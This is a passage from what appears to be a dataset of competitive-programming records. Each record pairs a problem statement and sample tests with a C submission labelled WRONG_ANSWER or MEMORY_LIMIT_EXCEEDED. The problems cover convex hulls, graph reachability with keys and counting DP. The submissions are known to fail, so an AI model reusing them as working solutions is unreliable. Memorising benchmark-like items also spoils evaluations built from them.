cell only to side-adjacent ones, but it is forbidden to go beyond the map edges. Also the following restriction is imposed on the path: it is not allowed to visit more than k different types of squares (squares of one type can be visited an infinite number of times). Squares marked with S and T have no type, so they are not counted. But S must be visited exactly once \u2014 at the very beginning, and T must be visited exactly once \u2014 at the very end.Your task is to find the path from the square S to the square T that takes minimum time. Among all shortest paths you should choose the lexicographically minimal one. When comparing paths you should lexicographically represent them as a sequence of characters, that is, of plot types.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains three integers n, m and k (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u200950,\u2009n\u00b7m\u2009\u2265\u20092,\u20091\u2009\u2264\u2009k\u2009\u2264\u20094). Then n lines contain the map. Each line has the length of exactly m characters and consists of lowercase Latin letters and characters S and T. It is guaranteed that the map contains exactly one character S and exactly one character T. Pretest 12 is one of the maximal tests for this problem.","output_spec":"If there is a path that satisfies the condition, print it as a sequence of letters \u2014 the plot types. Otherwise, print \"-1\" (without quotes). You shouldn't print the character S in the beginning and T in the end. Note that this sequence may be empty. This case is present in pretests. You can just print nothing or print one \"End of line\"-character. Both will be accepted.","notes":null,"sample_inputs":["5 3 2\nSba\nccc\naac\nccc\nabT","3 4 1\nSxyy\nyxxx\nyyyT","1 3 3\nTyS","1 4 1\nSxyT"],"sample_outputs":["bcccc","xxxx","y","-1"]}
{"difficulty":2700,"lang":"GNU C11","lang_cluster":"c","src_uid":"40002052843ca0357dbd3158b16d59f4","submission_id":"c07c92ade70ce93a633cd1d553220a27","tags":["dp","greedy","graphs","number theory","math","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n\n#define A\t5000\n#define N_\t(A * 3)\n#define INF\t0x3f3f3f3f3f3f3f3fLL\n\nlong long min(long long a, long long b) { return a < b ? a : b; }\n\nint oo[1 + (N_ - 1) * 2], oj[1 + (N_ - 1) * 2];\n\nint link(int o, int j) {\n\tstatic int _ = 1;\n\n\too[_] = o, oj[_] = j;\n\treturn _++;\n}\n\nint count(int n, int p) {\n\treturn n < p ? 0 : n \/ p + count(n \/ p, p);\n}\n\nint ae[N_], pp[N_], dd[N_], sz[N_], ii[A + 1], n;\n\nvoid init() {\n\tstatic char composite[A + 1];\n\tstatic int primes[A + 1];\n\tint n_, a, b, cnt, i, j;\n\n\tfor (a = 2; a <= A \/ a; a++) {\n\t\tif (composite[a])\n\t\t\tcontinue;\n\t\tfor (b = a * a; b <= A; b += a)\n\t\t\tcomposite[b] = 1;\n\t}\n\tcnt = 0;\n\tfor (a = 2; a <= A; a++)\n\t\tif (!composite[a])\n\t\t\tprimes[cnt++] = a;\n\tn_ = 0;\n\tpp[n_] = -1, dd[n_] = 0;\n\tii[1] = n_++;\n\tfor (a = 2; a <= A; a++) {\n\t\tint h, d, d_;\n\n\t\td = 0;\n\t\tfor (h = 0; h < cnt; h++)\n\t\t\td += count(a, primes[h]);\n\t\td_ = 0;\n\t\tfor (h = cnt - 1; h >= 0; h--) {\n\t\t\td_ += count(a - 1, primes[h]);\n\t\t\tif (a % primes[h] == 0)\n\t\t\t\tbreak;\n\t\t}\n\t\ti = ii[a - 1], j = -1;\n\t\twhile (1)\n\t\t\tif (dd[i] > d_)\n\t\t\t\tj = i, i = pp[i];\n\t\t\telse if (dd[i] == d_) {\n\t\t\t\tpp[n_] = i, dd[n_] = d, n_++;\n\t\t\t\tii[a] = n_ - 1;\n\t\t\t\tbreak;\n\t\t\t} else {\n\t\t\t\tint k = n_++;\n\n\t\t\t\tpp[k] = i, dd[k] = d_;\n\t\t\t\tif (j != -1)\n\t\t\t\t\tpp[j] = k;\n\t\t\t\tpp[n_] = k, dd[n_] = d, n_++;\n\t\t\t\tii[a] = n_ - 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t}\n\tfor (j = 1; j < n_; j++) {\n\t\ti = pp[j];\n\t\tae[i] = link(ae[i], j), ae[j] = link(ae[j], i);\n\t}\n}\n\nlong long dfs1(int p, int i) {\n\tint o;\n\tlong long x;\n\n\tx = (long long) sz[i] * dd[i];\n\tfor (o = ae[i]; o; o = oo[o]) {\n\t\tint j = oj[o];\n\t\t\n\t\tif (j != p) {\n\t\t\tsz[i] += sz[j];\n\t\t\tx += dfs1(i, j);\n\t\t}\n\t}\n\treturn x;\n}\n\nlong long ans;\n\nvoid dfs2(int p, int i, long long x) {\n\tint o;\n\n\tans = min(ans, x);\n\tfor (o = ae[i]; o; o = oo[o]) {\n\t\tint j = oj[o];\n\n\t\tif (j != p) {\n\t\t\tint w = abs(dd[i] - dd[j]);\n\n\t\t\tdfs2(i, j, x - (long long) sz[j] * w + (long long) (n - sz[j]) * w);\n\t\t}\n\t}\n}\n\nint main() {\n\tint i;\n\n\tinit();\n\tscanf(\"%d\", &n);\n\tfor (i = 0; i < n; i++) {\n\t\tint a;\n\n\t\tscanf(\"%d\", &a);\n\t\tsz[ii[a > 0 ? a : 1]]++;\n\t}\n\tans = INF;\n\tdfs2(-1, 0, dfs1(-1, 0));\n\tprintf(\"%lld\\n\", ans);\n\treturn 0;\n}\n","description":"\u00c6sir - CHAOS \u00c6sir - V.\"Everything has been planned out. No more hidden concerns. The condition of Cytus is also perfect.The time right now...... 00:01:12......It's time.\"The emotion samples are now sufficient. After almost 3 years, it's time for Ivy to awake her bonded sister, Vanessa.The system inside A.R.C.'s Library core can be considered as an undirected graph with infinite number of processing nodes, numbered with all positive integers ($$$1, 2, 3, \\ldots$$$). The node with a number $$$x$$$ ($$$x &gt; 1$$$), is directly connected with a node with number $$$\\frac{x}{f(x)}$$$, with $$$f(x)$$$ being the lowest prime divisor of $$$x$$$.Vanessa's mind is divided into $$$n$$$ fragments. Due to more than 500 years of coma, the fragments have been scattered: the $$$i$$$-th fragment is now located at the node with a number $$$k_i!$$$ (a factorial of $$$k_i$$$).To maximize the chance of successful awakening, Ivy decides to place the samples in a node $$$P$$$, so that the total length of paths from each fragment to $$$P$$$ is smallest possible. If there are multiple fragments located at the same node, the path from that node to $$$P$$$ needs to be counted multiple times.In the world of zeros and ones, such a requirement is very simple for Ivy. Not longer than a second later, she has already figured out such a node.But for a mere human like you, is this still possible?For simplicity, please answer the minimal sum of paths' lengths from every fragment to the emotion samples' assembly node $$$P$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer $$$n$$$ ($$$1 \\le n \\le 10^6$$$)\u00a0\u2014 number of fragments of Vanessa's mind. The second line contains $$$n$$$ integers: $$$k_1, k_2, \\ldots, k_n$$$ ($$$0 \\le k_i \\le 5000$$$), denoting the nodes where fragments of Vanessa's mind are located: the $$$i$$$-th fragment is at the node with a number $$$k_i!$$$.","output_spec":"Print a single integer, denoting the minimal sum of path from every fragment to the node with the emotion samples (a.k.a. node $$$P$$$). As a reminder, if there are multiple fragments at the same node, the distance from that node to $$$P$$$ needs to be counted multiple times as well.","notes":"NoteConsidering the first $$$24$$$ nodes of the system, the node network will look as follows (the nodes $$$1!$$$, $$$2!$$$, $$$3!$$$, $$$4!$$$ are drawn bold):For the first example, Ivy will place the emotion samples at the node $$$1$$$. From here:  The distance from Vanessa's first fragment to the node $$$1$$$ is $$$1$$$.  The distance from Vanessa's second fragment to the node $$$1$$$ is $$$0$$$.  The distance from Vanessa's third fragment to the node $$$1$$$ is $$$4$$$. The total length is $$$5$$$.For the second example, the assembly node will be $$$6$$$. From here:  The distance from Vanessa's first fragment to the node $$$6$$$ is $$$0$$$.  The distance from Vanessa's second fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's third fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's fourth fragment to the node $$$6$$$ is again $$$2$$$. The total path length is $$$6$$$.","sample_inputs":["3\n2 1 4","4\n3 1 4 4","4\n3 1 4 1","5\n3 1 4 1 5"],"sample_outputs":["5","6","6","11"]}
{"difficulty":2300,"lang":"GNU C","lang_cluster":"c","src_uid":"52b13cca189853e6af02bea8d3d85276","submission_id":"re_283","tags":["dsu","graphs"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include<math.h>\n#include<time.h>\n#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#define oo 1000000000\n#define pi 3.14159265359\n#define zero(a) (abb(a)<=1e-7)\n#define lowbit(a) ((a)&(-(a)))\n#define min(a,b) ((a)<(b)?(a):(b))\n#define max(a,b) ((a)>(b)?(a):(b))\n#define abb(a) ((a)>0?(a):(-(a)))\n#define cj(x1,y1,x2,y2) ((x1)*(y2)-(x2)*(y2))\n#define dj(x1,y1,x2,y2) ((x1)*(y1)+(y1)*(y2))\n#define dis(x1,y1,x2,y2) sqrt(((x2)-(x1))*((x2)-(x1))+((y2)-(y1))*((y2)-(y1)))\n\nlong min[1001]={0},rec[1001]={0},ed[1001][2]={0},post[1001]={0},f[1001]={0},stay[1001][1001]={0},ps[1001]={0},head[1001]={0},e[2001]={0},next[2001]={0},v[2001]={0};\nchar str[15]={0},th[1001][1001]={0},town[1001][1001]={0},hash[1001][1001]={0},own[1001][1001]={0},name[1001][15]={0};\nlong n,m,totm=0,flag=0;\n\nvoid add(long a,long b,long c)\n{\n   e[++totm]=b;\n   next[totm]=head[a];\n   head[a]=totm;\n   v[totm]=c;\n}\n\nlong getf(long now)\n{\n   if (f[now]==now)\n      return now;\n   return f[now]=getf(f[now]);\n}\n\nvoid dfs(long now,long x)\n{\n   long i,j,fa;\n   hash[x][now]=1;\n   stay[now][++ps[now]]=x;\n   flag++;\n   for (i=1;i<ps[now];i++)\n      if (x!=(fa=getf(stay[now][i])))\n      {\n         f[fa]=x;\n         for (j=1;j<=m;j++)\n            if (own[fa][j]&&!own[x][j])\n            {\n               own[x][j]=1;\n               rec[j]=flag;\n            }\n         for (j=1;j<=n;j++)\n            hash[x][j]|=hash[fa][j];\n      }\n   for (i=1;i<=m;i++)\n      if (rec[i]==flag)\n      {\n         if (hash[x][ed[i][0]]&&!hash[x][ed[i][1]])\n            dfs(ed[i][1],x);\n         else if (hash[x][ed[i][1]]&&!hash[x][ed[i][0]])\n            dfs(ed[i][0],x);\n      }\n   for (i=head[now];i;i=next[i])\n      if (!hash[x][e[i]]&&own[x][v[i]])\n         dfs(e[i],x);\n}\n\nint main()\n{\n   long i,j,k,a,b,pos,num,x,ans=1;\n   scanf(\"%ld%ld%ld\",&n,&m,&k);\n   for (i=1;i<=m;i++)\n   {\n      scanf(\"%ld%ld\",&a,&b);\n      ed[i][0]=a;\n      ed[i][1]=b;\n      add(a,b,i);\n      add(b,a,i);\n   }\n   for (i=1;i<=k;i++)\n   {\n      f[i]=i;\n      scanf(\"%s%ld%ld\",name[i]+1,&post[i],&num);\n      stay[post[i]][++ps[post[i]]]=i;\n      while (num--)\n      {\n         scanf(\"%ld\",&x);\n         own[i][x]=1;\n      }\n   }\n   for (i=1;i<=k;i++)\n      if (f[i]==i)\n         dfs(post[i],i);\n   for (i=1;i<=k;i++)\n      for (j=1;j<=m;j++)\n         town[i][j]=own[getf(i)][j];\n   for (i=1;i<=k;i++)\n      for (j=1;j<=n;j++)\n         th[i][j]=hash[f[i]][j];\n   memset(ps,0,sizeof(ps));\n   memset(own,0,sizeof(own));\n   memset(hash,0,sizeof(hash));\n   for (i=1;i<=k;i++)\n   {\n      f[i]=i;\n      scanf(\"%s%ld%ld\",str+1,&pos,&num);\n      for (j=1;strcmp(name[j]+1,str+1);j++);\n      post[j]=pos;\n      stay[post[j]][++ps[post[j]]]=j;\n      while (num--)\n      {\n         scanf(\"%ld\",&x);\n         own[j][x]=1;\n      }\n   }\n   for (i=1;i<=k;i++)\n      if (f[i]==i)\n         dfs(post[i],i);\n   for (i=1;i<=k;i++)\n      for (j=1;j<=m;j++)\n         if (town[i][j]!=own[getf(i)][j])\n            ans=0;\n   for (i=1;i<=k;i++)\n      for (j=1;j<=n;j++)\n         if (th[i][j]!=hash[f[i]][j])\n            ans=0;\n   puts(ans?\"YES\":\"NO\");\n   return 0;\n}\n\/*\n2 1 2\n1 2\nDmitry 1 1 1\nNatalia 2 0\nNatalia 1 1 1\nDmitry 2 0\n\n3 3 3\n1 2\n2 3\n3 1\na 1 1 1\nb 2 1 3\nc 3 1 2\nb 1 1 2\nc 2 1 3\na 3 1 1\n\n4 5 3\n1 2\n2 3\n2 4\n1 3\n1 3\na 1 2 4 3\nb 1 0\nc 4 3 1 2 5\na 1 2 4 3\nb 1 1 5\nc 4 2 1 2\n*\/\n","description":"Today you are to solve the problem even the famous Hercule Poirot can't cope with! That's why this crime has not yet been solved and this story was never included in Agatha Christie's detective story books. You are not informed on what crime was committed, when and where the corpse was found and other details. We only know that the crime was committed in a house that has n rooms and m doors between the pairs of rooms. The house residents are very suspicious, that's why all the doors can be locked with keys and all the keys are different. According to the provided evidence on Thursday night all the doors in the house were locked, and it is known in what rooms were the residents, and what kind of keys had any one of them. The same is known for the Friday night, when all the doors were also locked. On Friday it was raining heavily, that's why nobody left the house and nobody entered it. During the day the house residents could  open and close doors to the neighboring rooms using the keys at their disposal (every door can be opened and closed from each side);  move freely from a room to a room if a corresponding door is open;  give keys to one another, being in one room.  \"Little grey matter\" of Hercule Poirot are not capable of coping with such amount of information. Find out if the positions of people and keys on the Thursday night could result in the positions on Friday night, otherwise somebody among the witnesses is surely lying.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three preset integers n, m \u0438 k (1\u2009\u2264\u2009n,\u2009m,\u2009k\u2009\u2264\u20091000) \u2014 the number of rooms, the number of doors and the number of house residents respectively. The next m lines contain pairs of room numbers which join the doors. The rooms are numbered with integers from 1 to n. There cannot be more that one door between the pair of rooms. No door connects a room with itself. The next k lines describe the residents' position on the first night. Every line contains a resident's name (a non-empty line consisting of no more than 10 Latin letters), then after a space follows the room number, then, after a space \u2014 the number of keys the resident has. Then follow written space-separated numbers of the doors that can be unlocked by these keys. The doors are numbered with integers from 1 to m in the order in which they are described in the input data. All the residents have different names, uppercase and lowercase letters considered to be different. Every m keys occurs exactly once in the description. Multiple people may be present in one room, some rooms may be empty. The next k lines describe the position of the residents on the second night in the very same format. It is guaranteed that in the second night's description the residents' names remain the same and every m keys occurs exactly once.","output_spec":"Print \"YES\" (without quotes) if the second arrangement can result from the first one, otherwise, print \"NO\".","notes":null,"sample_inputs":["2 1 2\n1 2\nDmitry 1 1 1\nNatalia 2 0\nNatalia 1 1 1\nDmitry 2 0","4 4 3\n1 3\n1 2\n2 3\n3 4\nArtem 1 1 4\nDmitry 1 1 2\nEdvard 4 2 1 3\nArtem 2 0\nDmitry 1 0\nEdvard 4 4 1 2 3 4"],"sample_outputs":["YES","NO"]}
{"difficulty":1900,"lang":"GNU C","lang_cluster":"c","src_uid":"6214a85d2be0a908dcbfe089327cf51a","submission_id":"re_1483","tags":["games"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n\nint min(int a, int b)\n{\n     if (a < b) {\n\t  return a;\n     } else {\n\t  return b;\n     }\n}\n\nint main()\n{\n     int n, m, k, f = 0, i;\n\n     scanf(\"%d %d %d\", &n, &m, &k);\n\n     for (i = 0; i < k; i++) {\n\t  int x, y;\n\n\t  scanf(\"%d %d\", &x, &y);\n\n\t  if (min(min(x, n - x + 1), min(y, m - y + 1)) < 5) f = 1;\n     }\n\n     if (f == 1) {\n\t  puts(\"YES\");\n     } else {\n\t  puts(\"NO\");\n     }\n\n     return 0;\n}\n","description":"Volodya and Vlad play the following game. There are k pies at the cells of n\u2009\u2009\u00d7\u2009\u2009m board. Each turn Volodya moves one pie to the neighbouring (by side) cell. If the pie lies at the border of the board then Volodya can move it outside the board, get the pie and win. After Volodya's move, Vlad bans some edge at the border of the board of length 1 (between two knots of the board) so that Volodya is not able to move the pie outside the board through this edge anymore. The question is: will Volodya win this game? We suppose both players follow the optimal strategy.","input_from":"standard input","output_to":"standard output","input_spec":"First line contains 3 integers, separated by space: 1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100 \u2014 dimensions of the board and 0\u2009\u2264\u2009k\u2009\u2264\u2009100 \u2014 the number of pies. Each of the next k lines contains 2 integers, separated by space: 1\u2009\u2264\u2009x\u2009\u2264\u2009n, 1\u2009\u2264\u2009y\u2009\u2264\u2009m \u2014 coordinates of the corresponding pie. There could be more than one pie at a cell. ","output_spec":"Output only one word: \"YES\" \u2014 if Volodya wins, \"NO\" \u2014 otherwise.","notes":null,"sample_inputs":["2 2 1\n1 2","3 4 0","100 50 2\n50 25\n50 25"],"sample_outputs":["YES","NO","NO"]}
{"difficulty":2700,"lang":"GNU C11","lang_cluster":"c","src_uid":"6220f4058f9325dfb211fb1dd86e9464","submission_id":"re_1164","tags":["data structures","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n\n#define X\t1000000\n#define Q\t100000\n\nlong long cross2(long long x1, long long y1, long long x2, long long y2) {\n\treturn x1 * y2 - x2 * y1;\n}\n\nstruct P {\n\tint x, y;\n} *pl, *pr;\n\ntypedef struct P *T[(X + X + 1) * 4];\n\nlong long cross(struct P *o, struct P *p, struct P *q) {\n\treturn cross2(p->x - o->x, p->y - o->y, q->x - o->x, q->y - o->y);\n}\n\nstruct P *min(struct P *p, struct P *q) {\n\treturn p != NULL && q != NULL ? (p->x < q->x ? p : q) : (p == NULL ? q : p);\n}\n\nstruct P *max(struct P *p, struct P *q) {\n\treturn p != NULL && q != NULL ? (p->x > q->x ? p : q) : (p == NULL ? q : p);\n}\n\nvoid update(T tl, T tr, int k, int l, int r, int x, struct P *p) {\n\tint m;\n\n\tif (r - l == 1) {\n\t\ttl[k] = tr[k] = p;\n\t\treturn;\n\t}\n\tm = (l + r) \/ 2;\n\tif (x < m)\n\t\tupdate(tl, tr, k * 2 + 1, l, m, x, p);\n\telse\n\t\tupdate(tl, tr, k * 2 + 2, m, r, x, p);\n\ttr[k] = min(tr[k * 2 + 1], tr[k * 2 + 2]);\n\ttl[k] = max(tl[k * 2 + 1], tl[k * 2 + 2]);\n}\n\nvoid query(T tl, T tr, int k, int l, int r, int x) {\n\tint m;\n\n\tif (r - l == 1) {\n\t\tpl = max(pl, tl[k]);\n\t\tpr = min(pr, tr[k]);\n\t\treturn;\n\t}\n\tm = (l + r) \/ 2;\n\tif (x < m) {\n\t\tpr = min(pr, tr[k * 2 + 2]);\n\t\tquery(tl, tr, k * 2 + 1, l, m, x);\n\t} else {\n\t\tpl = max(pl, tl[k * 2 + 1]);\n\t\tquery(tl, tr, k * 2 + 2, m, r, x);\n\t}\n}\n\nint query_(T tl_up, T tr_up, T tl_dn, T tr_dn, struct P *p, int insert) {\n\tstruct P *q;\n\tint inside = 1;\n\n\tpl = pr = NULL;\n\tquery(tl_up, tr_up, 0, 0, X + X + 1, p->x);\n\tif ((pl == pr\n\t\t\t\t&& (pl == NULL || pl->y < p->y))\n\t\t\t|| (pl != pr\n\t\t\t\t&& (pl == NULL || pr == NULL || cross(pl, p, pr) < 0))) {\n\t\tif (insert) {\n\t\t\twhile ((q = pl) && q->x > 0) {\n\t\t\t\tpl = pr = NULL;\n\t\t\t\tquery(tl_up, tr_up, 0, 0, X + X + 1, q->x - 1);\n\t\t\t\tif (!pl || cross(pl, q, p) < 0)\n\t\t\t\t\tbreak;\n\t\t\t\tupdate(tl_up, tr_up, 0, 0, X + X + 1, q->x, NULL);\n\t\t\t}\n\t\t\twhile ((q = pr) && q->x < X + X) {\n\t\t\t\tpl = pr = NULL;\n\t\t\t\tquery(tl_up, tr_up, 0, 0, X + X + 1, q->x + 1);\n\t\t\t\tif (!pr || cross(p, q, pr) < 0)\n\t\t\t\t\tbreak;\n\t\t\t\tupdate(tl_up, tr_up, 0, 0, X + X + 1, q->x, NULL);\n\t\t\t}\n\t\t\tupdate(tl_up, tr_up, 0, 0, X + X + 1, p->x, p);\n\t\t}\n\t\tinside = 0;\n\t}\n\tpl = pr = NULL;\n\tquery(tl_dn, tr_dn, 0, 0, X + X + 1, p->x);\n\tif ((pl == pr\n\t\t\t\t&& (pl == NULL || pl->y > p->y))\n\t\t\t|| (pl != pr\n\t\t\t\t&& (pl == NULL || pr == NULL || cross(pl, p, pr) > 0))) {\n\t\tif (insert) {\n\t\t\twhile ((q = pl) && q->x > 0) {\n\t\t\t\tpl = pr = NULL;\n\t\t\t\tquery(tl_dn, tr_dn, 0, 0, X + X + 1, q->x - 1);\n\t\t\t\tif (!pl || cross(pl, q, p) > 0)\n\t\t\t\t\tbreak;\n\t\t\t\tupdate(tl_dn, tr_dn, 0, 0, X + X + 1, q->x, NULL);\n\t\t\t}\n\t\t\twhile ((q = pr) && q->x < X + X) {\n\t\t\t\tpl = pr = NULL;\n\t\t\t\tquery(tl_dn, tr_dn, 0, 0, X + X + 1, q->x + 1);\n\t\t\t\tif (!pr || cross(p, q, pr) > 0)\n\t\t\t\t\tbreak;\n\t\t\t\tupdate(tl_dn, tr_dn, 0, 0, X + X + 1, q->x, NULL);\n\t\t\t}\n\t\t\tupdate(tl_dn, tr_dn, 0, 0, X + X + 1, p->x, p);\n\t\t}\n\t\tinside = 0;\n\t}\n\treturn inside;\n}\n\nint main() {\n\tstatic T tl_up, tr_up, tl_dn, tr_dn;\n\tint q;\n\n\tscanf(\"%d\", &q);\n\twhile (q-- > 0) {\n\t\tstruct P *p = malloc(sizeof *p);\n\t\tint t;\n\n\t\tscanf(\"%d%d%d\", &t, &p->x, &p->y);\n\t\tp->x += X;\n\t\tif (t == 1)\n\t\t\tquery_(tl_up, tr_up, tl_dn, tr_dn, p, 1);\n\t\telse\n\t\t\tprintf(query_(tl_up, tr_up, tl_dn, tr_dn, p, 0) ? \"YES\\n\" : \"NO\\n\");\n\t}\n\treturn 0;\n}\n","description":"Once a walrus professor Plato asked his programming students to perform the following practical task. The students had to implement such a data structure that would support a convex hull on some set of points S. The input to the program had q queries of two types: 1. Add a point with coordinates (x,\u2009y) into the set S. Note that in this case the convex hull of S could have changed, and could have remained the same. 2. Say whether a point with coordinates (x,\u2009y) belongs to an area limited by the convex hull, including the border. All the students coped with the task. What about you?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer q (4\u2009\u2264\u2009q\u2009\u2264\u2009105).  Then follow q lines in the following way: \"t x y\", where t is the query type (1 or 2), and (x,\u2009y) are the coordinates of the point (\u2009-\u2009106\u2009\u2264\u2009x,\u2009y\u2009\u2264\u2009106, x and y are integers).  There is at least one query of type 2. It is guaranteed that the three queries of the first type follow first and the points given in the queries form a non-degenerative triangle. Also all the points added in S are distinct.","output_spec":"For each query of the second type print one string containing \"YES\", if the point lies inside the convex hull or on its border. Otherwise, print \"NO\".","notes":null,"sample_inputs":["8\n1 0 0\n1 2 0\n1 2 2\n2 1 0\n1 0 2\n2 1 1\n2 2 1\n2 20 -1"],"sample_outputs":["YES\nYES\nYES\nNO"]}
{"difficulty":2400,"lang":"GNU C","lang_cluster":"c","src_uid":"788cb3da98fd4a56720f800588061b79","submission_id":"re_1476","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#define MOD 1000000007\nint n,m,a[210];\nlong long ans,f[2][210][1010];\nint comp(const void *a,const void *b)\n{\n    return *(int*)a - *(int*)b;\n}\nint main()\n{\n    int i,j,k,v;\n    scanf(\"%d%d\",&n,&m);\n    for(i=1;i<=n;i++) scanf(\"%d\",&a[i]);\n    qsort(a+1,n,sizeof(int),comp);\n    f[0][1][0] = f[0][0][0] = 1;\n    for(i=2;i<=n;i++)\n    {\n        v = a[i]-a[i-1];\n        for(j=0;j<=n;j++) for(k=0;k<=m;k++)\n        {\n            if(k>=j*v) f[1][j][k] = (f[1][j][k]+f[0][j][k-j*v]*(j?2:1))%MOD;\n            if(j&&k>=(j-1)*v) f[1][j][k] = (f[1][j][k]+f[0][j-1][k-(j-1)*v])%MOD;\n            if(k>=(j+1)*v) f[1][j][k] = (f[1][j][k]+f[0][j+1][k-(j+1)*v])%MOD;\n        }\n        memcpy(f[0],f[1],sizeof(f[1]));\n        memset(f[1],0,sizeof(f[1]));\n    }\n    for(k=0;k<=m;k++) ans = (ans+f[0][0][k])%MOD;\n    printf(\"%I64d\",ans);\n    return 0;\n}","description":"There are n students in a class working on group projects. The students will divide into groups (some students may be in groups alone), work on their independent pieces, and then discuss the results together. It takes the i-th student ai minutes to finish his\/her independent piece.If students work at different paces, it can be frustrating for the faster students and stressful for the slower ones. In particular, the imbalance of a group is defined as the maximum ai in the group minus the minimum ai in the group. Note that a group containing a single student has an imbalance of 0. How many ways are there for the students to divide into groups so that the total imbalance of all groups is at most k?Two divisions are considered distinct if there exists a pair of students who work in the same group in one division but different groups in the other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u2009200, 0\u2009\u2264\u2009k\u2009\u2264\u20091000)\u00a0\u2014 the number of students and the maximum total imbalance allowed, respectively. The second line contains n space-separated integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009500)\u00a0\u2014 the time it takes the i-th student to complete his\/her independent piece of work.","output_spec":"Print a single integer, the number of ways the students can form groups. As the answer may be large, print its value modulo 109\u2009+\u20097.","notes":"NoteIn the first sample, we have three options:   The first and second students form a group, and the third student forms a group. Total imbalance is 2\u2009+\u20090\u2009=\u20092.  The first student forms a group, and the second and third students form a group. Total imbalance is 0\u2009+\u20091\u2009=\u20091.  All three students form their own groups. Total imbalance is 0. In the third sample, the total imbalance must be 0, so each student must work individually.","sample_inputs":["3 2\n2 4 5","4 3\n7 8 9 10","4 0\n5 10 20 21"],"sample_outputs":["3","13","1"]}
{"difficulty":1700,"lang":"GNU C","lang_cluster":"c","src_uid":"867facaa8bcdfcb53ec3647387f7d23f","submission_id":"re_963","tags":["sortings","greedy","math"],"exec_outcome":"WRONG_ANSWER","source_code":"\n#include <stdio.h>\n\n#define FOR(index, max_val) for(index = 0; index < max_val; index++)\n\nint array[10000];\nint indexes[10000];\n\nint compare1(const void *a, const void *b) {\n  return ( array[*(int*)a] - array[*(int*)b] );\n}\n\nint main() {\n  int i;\n  int n, a, b;\n\n  scanf(\"%d%d%d\", &n, &a, &b);\n  FOR(i, n) {\n    scanf(\"%d\", &array[i]);\n    indexes[i] = i;\n    if(a < b) array[i] = -array[i];\n  }\n\n  if(a != b) {\n    qsort(indexes, n, sizeof(int), compare1);\n  }\n  FOR(i, n) {\n    if(i < a) array[indexes[i]] = 1;\n    else array[indexes[i]] = 2;\n  }\n\n\n  FOR(i, n) {\n    printf(\"%d\", array[i]);\n    if(i != n-1) printf(\" \");\n    else printf(\"\\n\");\n  }\n\n  return 0;\n}\n\n","description":"After the educational reform Polycarp studies only two subjects at school, Safety Studies and PE (Physical Education). During the long months of the fourth term, he received n marks in them. When teachers wrote a mark in the journal, they didn't write in what subject the mark was for, they just wrote the mark.Now it's time to show the journal to his strict parents. Polycarp knows that recently at the Parent Meeting the parents were told that he received a Safety Studies marks and b PE marks (a\u2009+\u2009b\u2009=\u2009n). Now Polycarp wants to write a subject's name in front of each mark so that:   there are exactly a Safety Studies marks,  there are exactly b PE marks,  the total average score in both subjects is maximum. An average subject grade is the sum of all marks in it, divided by the number of them. Of course, the division is performed in real numbers without rounding up or down. Polycarp aims to maximize the x1\u2009+\u2009x2, where x1 is the average score in the first subject (Safety Studies), and x2 is the average score in the second one (Physical Education).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009105), n is the number of marks in Polycarp's Journal. The second line contains two positive integers a,\u2009b (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n\u2009-\u20091,\u2009a\u2009+\u2009b\u2009=\u2009n). The third line contains a sequence of integers t1,\u2009t2,\u2009...,\u2009tn (1\u2009\u2264\u2009ti\u2009\u2264\u20095), they are Polycarp's marks.","output_spec":"Print the sequence of integers f1,\u2009f2,\u2009...,\u2009fn, where fi (1\u2009\u2264\u2009fi\u2009\u2264\u20092) is the number of a subject to which the i-th mark should be attributed. If there are several possible solutions, then print such that the sequence f1,\u2009f2,\u2009...,\u2009fn is the smallest lexicographically. The sequence p1,\u2009p2,\u2009...,\u2009pn is lexicographically less than q1,\u2009q2,\u2009...,\u2009qn if there exists such j (1\u2009\u2264\u2009j\u2009\u2264\u2009n) that pi\u2009=\u2009qi for all 1\u2009\u2264\u2009i\u2009&lt;\u2009j, \u0430nd pj\u2009&lt;\u2009qj.","notes":"NoteIn the first sample the average score in the first subject is equal to 4, and in the second one \u2014 to 4.5. The total average score is 8.5.","sample_inputs":["5\n3 2\n4 4 5 4 4","4\n2 2\n3 5 4 5","6\n1 5\n4 4 4 5 4 4"],"sample_outputs":["1 1 2 1 2","1 1 2 2","2 2 2 1 2 2"]}
